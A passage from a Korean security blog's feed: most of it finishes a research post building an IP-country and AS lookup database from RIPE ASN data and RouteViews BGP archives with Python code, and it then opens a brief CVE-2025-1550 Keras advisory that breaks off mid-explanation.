&#x2192; AS1299 &#x2192; AS16509 &#xC21C;&#xC73C;&#xB85C; &#xAC00;&#xC57C;&#xD55C;&#xB2E4;&#xB294; &#xC548;&#xB0B4;&#xB97C; &#xD558;&#xB294; &#xC0C1;&#xD669;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xC2DC;&#xB97C; &#xD1B5;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. AS215343(Minjaes Network)&#xB85C; &#xD5A5;&#xD558;&#xB294; &#xD328;&#xD0B7;&#xC744; traceroute&#xB97C; &#xD1B5;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;, AS17858(LG Powercomm) &#x2192; AS3786(LG Dacom) &#x2192; AS4637(Telstra) &#x2192; AS20473(Vultr) &#x2192; AS215343(Minjaes Network) &#xC21C;&#xC73C;&#xB85C; &#xD328;&#xD0B7;&#xC774; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image05.png" alt="png"></p><p>&#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC810;&#xC740;, &#xC800;&#xD76C; &#xC9D1;&#xC5D0;&#xC11C; Minjes Network&#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC740;, &#xD55C;&#xAD6D;&#xC5D0;&#xC11C; &#xD55C;&#xAD6D;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xD328;&#xD0B7;&#xC774;&#xC9C0;&#xB9CC;, &#xD64D;&#xCF69; &#x2192; &#xC77C;&#xBCF8;&#xC744; &#xACBD;&#xC720;&#xD558;&#xC5EC; &#xB2E4;&#xC2DC; &#xD55C;&#xAD6D;&#xC73C;&#xB85C; &#xB418;&#xB3CC;&#xC544;&#xC624;&#xB294; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; AS215343&#xC774; AS20473&#xACFC; &#xD2B8;&#xB79C;&#xC9D3;&#xC744; &#xB9FA;&#xC740; &#xB4A4;, &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xB97C; &#xD1B5;&#xD574; BGP&#xC804;&#xD30C;&#xB97C; &#xD558;&#xACE0; &#xC788;&#xC5B4; &#xC704;&#xC640; &#xAC19;&#xC740; &#xD1B5;&#xC2E0;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li>BGP &#xB370;&#xC774;&#xD130;&#xB97C; &#xAD00;&#xCE21;&#xD558;&#xACE0; &#xC81C;&#xACF5;&#xD574;&#xC8FC;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xC704;&#xCE58;&#xC5D0; &#xB530;&#xB77C; &#xACBD;&#xB85C;&#xAC00; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (AS4637&#xC774; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xB294; &#xC774;&#xC720;)</li></ul><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image06.png" alt="png"></p><blockquote><p>&#xCD9C;&#xCC98;: <a href="https://api.bgpview.io/assets/graphs/AS215343_Combined.svg">https://api.bgpview.io/assets/graphs/AS215343_Combined.svg</a></p></blockquote><p>&#xC815;&#xB9AC;&#xD558;&#xC790;&#xBA74;, BGP&#xB294; &#xC804; &#xC138;&#xACC4;&#xC5D0; &#xC788;&#xB294; AS&#xB4E4;&#xC774; &#xC11C;&#xB85C; &#xC790;&#xC2E0;&#xC774; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; IP&#xD504;&#xB9AC;&#xD53D;&#xC2A4;&#xC640; &#xACBD;&#xB85C;&#xC758; &#xC18D;&#xC131;&#xC744; &#xAD11;&#xACE0;&#xD558;&#xC5EC; &#xCD5C;&#xC801;&#xC758; &#xACBD;&#xB85C;&#xB85C; &#xCC3E;&#xC544;&#xC62C; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC548;&#xB0B4;&#xD558;&#xB294; &#xC77C;&#xC885;&#xC758; &#xB124;&#xBE44;&#xAC8C;&#xC774;&#xC158;&#xACFC; &#xAC19;&#xC740; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB85C;, &#xBC29;&#xAE08; &#xC0B4;&#xD3B4;&#xBCF8; BGP &#xB370;&#xC774;&#xD130;&#xB97C; &#xD65C;&#xC6A9;&#xD574; <strong>IP-&#xAD6D;&#xAC00;&#xB7;AS &#xB9E4;&#xD551; DB&#xB97C; &#xC9C1;&#xC811; &#xAD6C;&#xCD95;</strong>&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#x1F527;-BGP-&#xB370;&#xC774;&#xD130;-&#xAE30;&#xBC18;-IP-&#xAD6D;&#xAC00;-&#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;-&#xB9CC;&#xB4E4;&#xAE30;"><a href="#&#x1F527;-BGP-&#xB370;&#xC774;&#xD130;-&#xAE30;&#xBC18;-IP-&#xAD6D;&#xAC00;-&#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;-&#xB9CC;&#xB4E4;&#xAE30;" class="headerlink" title="&#x1F527; BGP &#xB370;&#xC774;&#xD130; &#xAE30;&#xBC18; IP &#xAD6D;&#xAC00; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xB9CC;&#xB4E4;&#xAE30;"></a><strong>&#x1F527;</strong> BGP &#xB370;&#xC774;&#xD130; &#xAE30;&#xBC18; IP &#xAD6D;&#xAC00; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xB9CC;&#xB4E4;&#xAE30;</h1><p>AS&#xC758; &#xD560;&#xB2F9; &#xC815;&#xBCF4;&#xB294; &#xC9C0;&#xC5ED;&#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;(RIR)&#xC5D0;&#xC11C; &#xBD80;&#xC5EC;&#xB97C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, part1&#xACFC; &#xAC19;&#xC774; &#xC9C0;&#xC5ED;&#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC758; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC1B;&#xC544; &#xD65C;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. ripe&#xC758; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xB294; Comma(,)&#xB85C; &#xAD6C;&#xBD84; &#xAC00;&#xB2A5;&#xD55C; &#xD615;&#xD0DC;&#xC758; &#xC804; &#xC138;&#xACC4; AS&#xC815;&#xBCF4;&#xAC00; &#xB9E4;&#xC77C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image07.png" alt="png"></p><blockquote><p><a href="https://ftp.ripe.net/ripe/asnames/asn.txt">https://ftp.ripe.net/ripe/asnames/asn.txt</a></p></blockquote><p>BGP &#xB370;&#xC774;&#xD130;&#xB294; &#xBBF8;&#xAD6D;&#xC758; Oregon &#xB300;&#xD559;&#xAD50;&#xC5D0;&#xC11C; RouteViews Archive&#xB77C;&#xB294; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0;&#xC11C; &#xC218;&#xC9D1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB294; &#xC5EC;&#xB7EC; ISP&#xC5C5;&#xCCB4;&#xC640; &#xD53C;&#xC5B4;&#xB9C1;&#xC744; &#xB9FA;&#xC740; &#xB4A4; &#xC218;&#xC9D1;&#xB41C; BGP &#xB370;&#xC774;&#xD130;&#xB97C; &#xACF5;&#xAC1C;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. 2001&#xB144; &#xBD80;&#xD130; &#xC2DC;&#xC791;&#xB418;&#xC5B4; &#xD604;&#xC7AC; &#xAE4C;&#xC9C0;&#xB3C4; &#xAFB8;&#xC900;&#xD788; &#xC5C5;&#xB85C;&#xB4DC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACE0; &#xC788;&#xC73C;&#xBA70;, 2&#xC2DC;&#xAC04;&#xB9C8;&#xB2E4; &#xCD5C;&#xC2E0; &#xB370;&#xC774;&#xD130;&#xAC00; &#xAC31;&#xC2E0;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image08.png" alt="png"></p><blockquote><p><a href="http://ftp.routeviews.org/bgpdata/">http://ftp.routeviews.org/bgpdata/</a></p></blockquote><p>routeviews&#xAC00; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC544;&#xCE74;&#xC774;&#xBE0C; &#xD30C;&#xC77C;&#xC740; RFC6396&#xC5D0; &#xC815;&#xC758;&#xB41C; MRT(Multi-Threaded Routing Toolkit Routing Information Export Format)&#xB77C;&#xB294; &#xD3EC;&#xB9F7; &#xD615;&#xD0DC;&#xB85C; &#xC81C;&#xACF5;&#xB429;&#xB2C8;&#xB2E4;. &#xAD6C;&#xC870;&#xD654;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB370;&#xC774;&#xD130;&#xC5EC;&#xC11C; bgpdump&#xB3C4;&#xAD6C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAC70;&#xB098;, &#xD30C;&#xC11C;&#xB97C; &#xC81C;&#xC791;&#xD574;&#xC11C; &#xD65C;&#xC6A9;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image09.png" alt="png"></p><p>&#xC774;&#xC81C;, &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xAE30; &#xC704;&#xD55C; &#xC6D0;&#xCC9C; &#xB370;&#xC774;&#xD130; &#xD655;&#xBCF4;&#xB294; &#xBAA8;&#xB450; &#xB05D;&#xB0AC;&#xC73C;&#xBA70;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB85C;&#xC9C1;&#xC73C;&#xB85C; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xBA74; &#xC644;&#xC131;&#xC785;&#xB2C8;&#xB2E4;.</p><ol><li>AS &#xC815;&#xBCF4; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;</li><li>AS &#xC815;&#xBCF4; &#xD30C;&#xC2F1;</li><li>BGP&#xC544;&#xCE74;&#xC774;&#xBE0C; &#xB370;&#xC774;&#xD130; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;</li><li>BGP&#xC544;&#xCE74;&#xC774;&#xBE0C; &#xB370;&#xC774;&#xD130; &#xD30C;&#xC2F1;</li><li>ASN, Prefix &#xB370;&#xC774;&#xD130; &#xAC00;&#xACF5; (IP&#xB300;&#xC5ED; 10&#xC9C4;&#xC218;&#xD654;)</li><li>&#xC774;&#xC9C4;&#xD0D0;&#xC0C9;</li></ol><p>&#xC774;&#xB97C; &#xCF54;&#xB4DC;&#xB85C; &#xAD6C;&#xD604;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-comment"># builtin modules</span><span class="hljs-keyword">from</span> ipaddress <span class="hljs-keyword">import</span> ip_network, IPv4Address<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> bz2<span class="hljs-keyword">import</span> readline<span class="hljs-comment"># install modules</span><span class="hljs-keyword">import</span> mrtparse<span class="hljs-keyword">import</span> requestsintervals=[]ASN_TABLE={}ASN_INFO_DB = <span class="hljs-string">&quot;asn.txt&quot;</span>IPINFO_DB = <span class="hljs-string">&quot;ipinfo_db.txt&quot;</span><span class="hljs-comment"># &#xC774;&#xC9C4;&#xD0D0;&#xC0C9;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">ip</span>):</span>    result = <span class="hljs-literal">None</span>    <span class="hljs-keyword">try</span>:        search_ip = int(IPv4Address(ip))    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    left, right = <span class="hljs-number">0</span>, len(intervals) - <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> left &lt;= right:        mid = (left + right) // <span class="hljs-number">2</span>        start_ip, end_ip, asn = intervals[mid]        <span class="hljs-keyword">if</span> start_ip &lt;= search_ip &lt;= end_ip:            result=(start_ip, end_ip, asn)            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">elif</span> start_ip &gt; search_ip:            right = mid - <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            left = mid + <span class="hljs-number">1</span>    <span class="hljs-keyword">if</span> result:        start_ip, end_ip, asn = result        prefix = <span class="hljs-string">f&quot;<span class="hljs-subst">{IPv4Address(start_ip)}</span>/<span class="hljs-subst">{<span class="hljs-number">32</span> - (end_ip - start_ip).bit_length()}</span>&quot;</span>        result={ <span class="hljs-string">&quot;ip&quot;</span>:ip, <span class="hljs-string">&quot;prefix&quot;</span>:prefix, <span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-literal">None</span>, <span class="hljs-string">&quot;asn&quot;</span>:asn, <span class="hljs-string">&quot;asn_description&quot;</span>:<span class="hljs-literal">None</span> }        result.update(ASN_TABLE[asn])        <span class="hljs-keyword">return</span> result    <span class="hljs-keyword">return</span> result<span class="hljs-comment"># MRT &#xB370;&#xC774;&#xD130; &#xD30C;&#xC2F1;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_rib_v4</span>(<span class="hljs-params">path</span>):</span>    TDV2_PEER_IDX = mrtparse.TD_V2_ST[<span class="hljs-string">&quot;PEER_INDEX_TABLE&quot;</span>]  <span class="hljs-comment"># 1</span>    TDV2_RIB_V4 = mrtparse.TD_V2_ST[<span class="hljs-string">&quot;RIB_IPV4_UNICAST&quot;</span>]    <span class="hljs-comment"># 2</span>    TABLE_DUMP_V2 = mrtparse.MRT_T[<span class="hljs-string">&quot;TABLE_DUMP_V2&quot;</span>]        <span class="hljs-comment"># 13</span>    <span class="hljs-keyword">with</span> bz2.open(path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> fd:        <span class="hljs-keyword">for</span> record <span class="hljs-keyword">in</span> mrtparse.Reader(fd):            <span class="hljs-keyword">if</span> record.err:                <span class="hljs-keyword">continue</span>            RECORD_TYPE = next(iter(record.data[<span class="hljs-string">&quot;type&quot;</span>].keys()))            RECORD_SUB_TYPE = next(iter(record.data[<span class="hljs-string">&quot;subtype&quot;</span>].keys()))            <span class="hljs-keyword">if</span> (RECORD_TYPE != TABLE_DUMP_V2) <span class="hljs-keyword">or</span> (RECORD_SUB_TYPE != TDV2_RIB_V4):                <span class="hljs-keyword">continue</span>            prefix = <span class="hljs-string">f&quot;<span class="hljs-subst">{record.data[<span class="hljs-string">&apos;prefix&apos;</span>]}</span>/<span class="hljs-subst">{record.data[<span class="hljs-string">&apos;length&apos;</span>]}</span>&quot;</span>            <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> record.data[<span class="hljs-string">&quot;rib_entries&quot;</span>]:                pidx = entry[<span class="hljs-string">&quot;peer_index&quot;</span>]                as_path_attr = next((a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> entry[<span class="hljs-string">&quot;path_attributes&quot;</span>] <span class="hljs-keyword">if</span> <span class="hljs-number">2</span> <span class="hljs-keyword">in</span> a[<span class="hljs-string">&quot;type&quot;</span>]), <span class="hljs-literal">None</span>)                path = []                <span class="hljs-keyword">if</span> as_path_attr:                    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> as_path_attr[<span class="hljs-string">&quot;value&quot;</span>]:                        path.extend(seg[<span class="hljs-string">&quot;value&quot;</span>])                <span class="hljs-keyword">yield</span> {<span class="hljs-string">&quot;prefix&quot;</span>:prefix, <span class="hljs-string">&quot;asn&quot;</span>:path[<span class="hljs-number">-1</span>]}                <span class="hljs-keyword">break</span> <span class="hljs-comment"># &#xACBD;&#xB85C; &#xC815;&#xBCF4;&#xB97C; &#xBCF4;&#xB294;&#xAC83;&#xC774; &#xC544;&#xB2C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Prefix&#xB294; &#xD55C; &#xBC88;&#xB9CC; &#xCC98;&#xB9AC;</span><span class="hljs-comment"># ASN &#xB370;&#xC774;&#xD130; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">download_asn_list</span>():</span>    r = requests.get(<span class="hljs-string">&quot;https://ftp.ripe.net/ripe/asnames/asn.txt&quot;</span>)    r.raise_for_status()    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:        <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;asn.txt&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:            f.write(r.content)    <span class="hljs-keyword">return</span><span class="hljs-comment"># IP&#xC815;&#xBCF4; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xC791;&#xC131;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_ipinfo_db</span>():</span><span class="hljs-comment"># &#xC2E4;&#xC81C; &#xC0AC;&#xC6A9;&#xD560; &#xB550;, rib&#xB370;&#xC774;&#xD130;&#xB97C; 2&#xC2DC;&#xAC04; &#xAC04;&#xACA9;&#xC73C;&#xB85C; &#xAC31;&#xC2E0;&#xD558;&#xC5EC; &#xC5C5;&#xB370;&#xC774;&#xD2B8;</span>    r = requests.get(<span class="hljs-string">&quot;http://ftp.routeviews.org/bgpdata/2025.07/RIBS/rib.20250711.1000.bz2&quot;</span>)    <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;rib.20250711.1000.bz2&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:        f.write(r.content)<span class="hljs-comment"># rib&#xB370;&#xC774;&#xD130;&#xB294; ip&#xC758; &#xC624;&#xB984;&#xCC28;&#xC21C;&#xC73C;&#xB85C; &#xC815;&#xB82C;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xD30C;&#xC2F1; &#xC21C;&#xC73C;&#xB85C; &#xC800;&#xC7A5;</span>    <span class="hljs-keyword">with</span> open(IPINFO_DB,<span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">as</span> f:        <span class="hljs-keyword">for</span> record <span class="hljs-keyword">in</span> parse_rib_v4(<span class="hljs-string">&quot;rib.20250711.1000.bz2&quot;</span>):            asn = record[<span class="hljs-string">&apos;asn&apos;</span>]            prefix = ip_network(record[<span class="hljs-string">&apos;prefix&apos;</span>])            ip_start = int(prefix[<span class="hljs-number">0</span>])            ip_end = int(prefix[<span class="hljs-number">-1</span>])            f.write(<span class="hljs-string">f&quot;<span class="hljs-subst">{ip_start}</span>,<span class="hljs-subst">{ip_end}</span>,<span class="hljs-subst">{asn}</span>\n&quot;</span>)    <span class="hljs-keyword">return</span><span class="hljs-comment"># &#xBA54;&#xBAA8;&#xB9AC; &#xB85C;&#xB4DC;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_database</span>():</span>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(ASN_INFO_DB):        download_asn_list()    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(IPINFO_DB):        build_ipinfo_db()    <span class="hljs-keyword">with</span> open(ASN_INFO_DB, <span class="hljs-string">&apos;r&apos;</span>) <span class="hljs-keyword">as</span> f:        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:            line = line.strip()            <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;,&apos;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> line:                <span class="hljs-keyword">continue</span>            asn, description = line.split(<span class="hljs-string">&apos; &apos;</span>, <span class="hljs-number">1</span>)            description, country = description.rsplit(<span class="hljs-string">&apos;, &apos;</span>, <span class="hljs-number">1</span>)            ASN_TABLE[asn] = {<span class="hljs-string">&quot;country&quot;</span>: country, <span class="hljs-string">&quot;asn_description&quot;</span>: description}        print(<span class="hljs-string">&quot;ASN table loadd&quot;</span>)    <span class="hljs-keyword">with</span> open(IPINFO_DB, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:            start_ip, end_ip, asn = line.strip().split(<span class="hljs-string">&quot;,&quot;</span>)            intervals.append((int(start_ip), int(end_ip), asn))    print(<span class="hljs-string">&quot;Databse load&quot;</span>)    <span class="hljs-keyword">return</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    init_database()    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        ip = input(<span class="hljs-string">&quot;Search: &quot;</span>)        ip_info=search(ip)        print(ip_info)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre><h1 id="&#x1F44B;-&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#x1F44B;-&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#x1F44B; &#xB9C8;&#xCE58;&#xBA70;"></a><strong>&#x1F44B;</strong> &#xB9C8;&#xCE58;&#xBA70;</h1><p>&#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C; &#xB9CC;&#xB4E0; IP&#xC815;&#xBCF4; &#xC870;&#xD68C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; Part1&#xC5D0;&#xC11C; &#xC5C5;&#xADF8;&#xB808;&#xC774;&#xB4DC; &#xB418;&#xC5B4; IP&#xB97C; &#xC870;&#xD68C;&#xD560; &#xACBD;&#xC6B0; &#xAD6D;&#xAC00; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD55C; asn, prefix, asn_description &#xC815;&#xBCF4;&#xB3C4; &#xD568;&#xAED8; &#xCD9C;&#xB825;&#xB418;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs json">{  <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;1.1.1.1&quot;</span>,  <span class="hljs-attr">&quot;prefix&quot;</span>: <span class="hljs-string">&quot;1.1.1.0/24&quot;</span>,  <span class="hljs-attr">&quot;country&quot;</span>: <span class="hljs-string">&quot;US&quot;</span>,  <span class="hljs-attr">&quot;asn&quot;</span>: <span class="hljs-string">&quot;13335&quot;</span>,  <span class="hljs-attr">&quot;asn_description&quot;</span>: <span class="hljs-string">&quot;CLOUDFLARENET&quot;</span>}</code></pre><p>IP&#xC815;&#xBCF4; &#xC870;&#xD68C; &#xC11C;&#xBE44;&#xC2A4;&#xC778; ipinfo.io&#xC640; &#xBE44;&#xAD50; &#xD574;&#xBD24;&#xC744; &#xB54C;, &#xB3D9;&#xC77C;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xC81C;&#xACF5;&#xB418;&#xB294; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image10.png" alt="png"></p><p>ipinfo.io&#xC640; &#xAC19;&#xC740; &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xBB3C;&#xB9AC;&#xC801; &#xC704;&#xCE58;, ISP, VPN, Proxy &#xC5EC;&#xBD80; &#xB4F1; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xD568;&#xAED8; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC815;&#xBCF4;&#xB294; &#xAC01; &#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5;&#xC5C5;&#xCCB4;&#xC758; &#xCC28;&#xBCC4;&#xD654;&#xB41C; &#xB178;&#xD558;&#xC6B0;&#xC640; &#xAE30;&#xC220;&#xB825;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xAD6C;&#xCD95;&#xB418;&#xC9C0;&#xB9CC;, IP&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC815;&#xBCF4;&#xC778; &#xAD6D;&#xAC00; &#xBC0F; AS &#xC815;&#xBCF4;&#xB294; &#xBCF8; &#xAE00;&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; &#xBC29;&#xBC95;&#xB860;&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC81C;&#xC791;&#xB418;&#xC5C8;&#xC744; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xCE21;&#xD574;&#xBD05;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/empty/">empty</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/Network/">Network</category>
      
      <category domain="https://hackyboiz.github.io/tags/RIR/">RIR</category>
      
      <category domain="https://hackyboiz.github.io/tags/IP/">IP</category>
      
      <category domain="https://hackyboiz.github.io/tags/ipwhois/">ipwhois</category>
      
      <category domain="https://hackyboiz.github.io/tags/bgp/">bgp</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-1550 : Keras의 모델 로딩 시 검증 미흡으로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/07/26/poosic/cve-2025-1550/</link>
      <guid>https://hackyboiz.github.io/2025/07/26/poosic/cve-2025-1550/</guid>
      <pubDate>Sat, 26 Jul 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/52359&quot;&gt;https://</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.exploit-db.com/exploits/52359">https://www.exploit-db.com/exploits/52359</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Keras &lt; v3.9</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CCVE-2025-1550&#xC740; Google&#xC774; &#xAC1C;&#xBC1C;&#xD55C; &#xB525;&#xB7EC;&#xB2DD; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC778; Keras&#xC758; <code>keras.models.load_model()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE) &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.<br>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBAA8;&#xB378; &#xD30C;&#xC77C;&#xC758; &#xAD6C;&#xC131; &#xC815;&#xBCF4;(<code>config.json</code>)&#xB97C; &#xBCC4;&#xB3C4;&#xC758; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xC545;&#xC758;&#xC801;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xB41C; &#xBAA8;&#xB378; &#xD30C;&#xC77C;&#xC744; 